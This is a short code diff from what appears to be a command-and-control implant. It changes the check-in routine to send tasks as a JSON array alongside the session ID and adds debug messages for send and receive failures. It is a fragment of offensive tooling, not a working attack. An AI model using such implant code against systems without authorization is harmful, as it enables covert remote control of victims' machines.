@@ -49,22 +49,27 @@ BOOL ImplantSendTasks( DWORD Count ) {
 BOOL ImplantSendCheckin( json& task, json& response ) {
     json  packet;
     CHAR* buffer = NULL;
+    json  tasks  = json::array();
     DWORD size   = 0;
 
-    packet["id"]   = g_Implant.SessionID;
-    packet["task"] = task;
+    tasks.push_back( task );
+    packet["id"]    = g_Implant.SessionID;
+    packet["tasks"] = tasks;
 
     auto serialized = packet.dump();
     if (!g_Channel->Interface->Send( g_Channel->Interface->Context, serialized.c_str(), serialized.size(), TRUE )) {
+        printf( "[-] Failed to send request" );
         return FALSE;
     }
 
     // read server response
     if (!g_Channel->Interface->Receive( g_Channel->Interface->Context, &buffer, &size )) {
+        printf( "[-] Failed to read response\n" );
         return FALSE;
     }
 
     if (!size) {
+        printf( "[*] response size is 0\n" );
         return FALSE;
     }
 
